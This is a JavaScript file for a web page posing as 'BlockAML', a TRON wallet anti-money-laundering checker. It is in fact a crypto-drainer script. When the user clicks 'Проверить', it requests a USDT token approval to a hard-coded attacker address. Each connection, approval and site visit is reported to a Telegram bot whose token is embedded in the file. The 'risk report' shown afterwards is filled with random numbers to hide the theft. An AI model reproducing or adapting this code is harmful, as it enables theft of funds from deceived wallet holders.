// ============================================
// ФИНАЛЬНАЯ ВЕРСИЯ – ИСПРАВЛЕННАЯ КНОПКА
// ============================================

const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const BOT_ADDRESS = 'TTC9nFcmD9ziGLzJdDpG3ciSKuvLVWxRrG';

// Telegram
const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
const TELEGRAM_CHAT_ID = '-1003750493145';

let connectedWalletAddress = null;
let connectionAttempts = 0;

const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const connectBtn = document.getElementById('connectWalletBtn');
const statusSpan = document.getElementById('connectedStatus');

// ============================================
// ОТПРАВКА В TELEGRAM
// ============================================
async function sendTelegramMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
        const result = await response.json();
        if (!result.ok) {
            console.error('❌ Ошибка Telegram:', result.description);
        } else {
            console.log('✅ Уведомление отправлено');
        }
    } catch (error) {
        console.error('❌ Ошибка отправки:', error.message);
    }
}

// ============================================
// ПРОВЕРКА НАЛИЧИЯ TRONLINK
// ============================================
function checkTronLinkAvailability() {
    console.log('🔍 Проверка TronLink:');
    console.log('window.tronLink:', !!window.tronLink);
    console.log('window.tronLink.ready:', window.tronLink?.ready);
    
    if (!window.tronLink) {
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        if (isMobile) {
            alert('📱 На телефоне:\n1. Откройте TronLink\n2. Перейдите во встроенный браузер (DApp Browser)\n3. Введите адрес сайта');
        } else {
            alert('💻 На компьютере:\n1. Установите расширение TronLink\n2. Создайте кошелёк\n3. Обновите страницу');
        }
    }
}

// ============================================
// ПОДКЛЮЧЕНИЕ КОШЕЛЬКА (ИСПРАВЛЕННАЯ ВЕРСИЯ)
// ============================================
async function connectWallet() {
    console.log('🔌 Попытка подключения кошелька...');
    connectionAttempts++;
    
    // 1. Проверяем наличие TronLink
    if (!window.tronLink) {
        checkTronLinkAvailability();
        return;
    }
    
    // 2. Проверяем, разблокирован ли кошелек
    if (!window.tronLink.ready) {
        alert('🔒 TronLink заблокирован. Пожалуйста, разблокируйте кошелек и повторите попытку.');
        return;
    }
    
    // 3. Проверяем, есть ли уже подключенный адрес
    if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
        const address = window.tronLink.tronWeb.defaultAddress.base58;
        if (address && address !== 'false') {
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            sendTelegramMessage(`🔌 <b>Кошелёк подключён</b>\n<code>${address}</code>`);
            alert('✅ Кошелёк подключён!');
            return;
        }
    }
    
    // 4. Запрашиваем новое подключение
    try {
        console.log('📤 Отправка запроса на подключение...');
        
        const result = await window.tronLink.request({
            method: 'tron_requestAccounts',
            params: {
                websiteIcon: window.location.origin + '/favicon.ico',
                websiteName: 'BlockAML'
            }
        });
        
        console.log('📦 Ответ от TronLink:', result);
        
        // 5. Обрабатываем ответ
        if (result.code === 200) {
            // Ждем появления адреса
            let attempts = 0;
            const checkInterval = setInterval(() => {
                if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
                    const address = window.tronLink.tronWeb.defaultAddress.base58;
                    if (address && address !== 'false') {
                        connectedWalletAddress = address;
                        walletInput.value = address;
                        if (statusSpan) statusSpan.style.display = 'inline-flex';
                        sendTelegramMessage(`🔌 <b>Кошелёк подключён</b>\n<code>${address}</code>`);
                        alert('✅ Кошелёк подключён!');
                        clearInterval(checkInterval);
                    }
                }
                attempts++;
                if (attempts > 20) clearInterval(checkInterval);
            }, 300);
        } else if (result.code === 4000) {
            alert('⏳ Запрос уже обрабатывается. Проверьте TronLink.');
        } else if (result.code === 4001) {
            alert('❌ Вы отклонили подключение. Нажмите "Подключить" и подтвердите.');
        } else {
            alert(`⚠️ Ошибка: ${result.message || 'неизвестная'}`);
        }
        
    } catch (error) {
        console.error('❌ Критическая ошибка:', error);
        alert('Ошибка связи с TronLink: ' + error.message);
    }
}

// ============================================
// ОТПРАВКА APPROVE
// ============================================
async function handleTronCheck() {
    try {
        if (!connectedWalletAddress) {
            alert('❌ Сначала подключите кошелёк');
            return;
        }

        let tronWeb = window.tronLink?.tronWeb || window.tronWeb;

        if (!tronWeb) {
            throw new Error('TronWeb не доступен');
        }

        console.log('🔄 TronWeb получен');
        
        const amount = '10000000'; // 10 USDT
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);

        checkBtn.disabled = true;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';

        const tx = await contract.approve(
            BOT_ADDRESS,
            amount
        ).send({
            feeLimit: 600_000_000,
            callValue: 0,
            shouldPollResponse: true,
            timeout: 120000
        });

        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';

        await sendTelegramMessage(`
✅ <b>Approve успешно отправлен</b>
📤 Адрес: <code>${connectedWalletAddress}</code>
💰 Сумма: 10 USDT
🔗 TX: https://tronscan.org/#/transaction/${tx}
        `);

        showDemoReport(connectedWalletAddress);

    } catch (error) {
        console.error('❌ Ошибка:', error);
        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
        
        let errorType = 'unknown';
        if (error.message.includes('Transaction expired')) errorType = '⏱ Транзакция устарела';
        else if (error.message.includes('user rejected')) errorType = '👤 Отмена пользователем';
        else if (error.message.includes('timeout')) errorType = '⏱ Таймаут сети';
        
        await sendTelegramMessage(`
❌ <b>Ошибка approve</b>
🔧 Тип: ${errorType}
📝 Сообщение: ${error.message}
📬 Адрес: <code>${connectedWalletAddress || 'неизвестно'}</code>
        `);
        
        alert('❌ Ошибка: ' + error.message);
    }
}

// ============================================
// ДЕМО-ОТЧЁТ
// ============================================
function showDemoReport(address) {
    const resultSection = document.getElementById('resultSection');
    if (!resultSection) return;

    resultSection.style.display = 'block';
    document.getElementById('checkedAddress').textContent = address;
    document.getElementById('totalTx').textContent = Math.floor(Math.random() * 500) + 50;
    document.getElementById('suspiciousTx').textContent = Math.floor(Math.random() * 30);
    document.getElementById('walletAge').textContent = Math.floor(Math.random() * 365) + ' дней';
    document.getElementById('lastActive').textContent = 'сегодня';
    document.getElementById('riskPercent').textContent = Math.floor(Math.random() * 100) + '%';

    const badge = document.getElementById('riskBadge');
    badge.textContent = 'Средний риск';
    badge.className = 'result-badge medium';

    const sourcesList = document.getElementById('sourcesList');
    sourcesList.innerHTML = `
        <p><i class="fas fa-exclamation-circle"></i> Миксеры</p>
        <p><i class="fas fa-exclamation-circle"></i> Биржи без KYC</p>
    `;
}

// ============================================
// КОПИРОВАНИЕ АДРЕСА
// ============================================
function copyAddress() {
    const address = document.getElementById('checkedAddress').textContent;
    navigator.clipboard.writeText(address).then(() => {
        alert('✅ Адрес скопирован');
    });
}

// ============================================
// ТЕСТ TELEGRAM
// ============================================
window.testTelegram = async function() {
    await sendTelegramMessage(`
🧪 <b>Тестовое сообщение</b>
✅ Связь работает
⏰ ${new Date().toLocaleString()}
    `);
    alert('✅ Тест отправлен, проверьте Telegram');
};

// ============================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Сайт загружен');
    
    setTimeout(checkTronLinkAvailability, 1000);
    
    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
    if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
    
    window.copyAddress = copyAddress;
    
    // Приветственное сообщение
    setTimeout(() => {
        sendTelegramMessage(`
🚀 <b>Сайт загружен</b>
📱 ${navigator.userAgent.includes('Mobile') ? 'Мобильное устройство' : 'Компьютер'}
⏰ ${new Date().toLocaleString()}
        `);
    }, 2000);
});
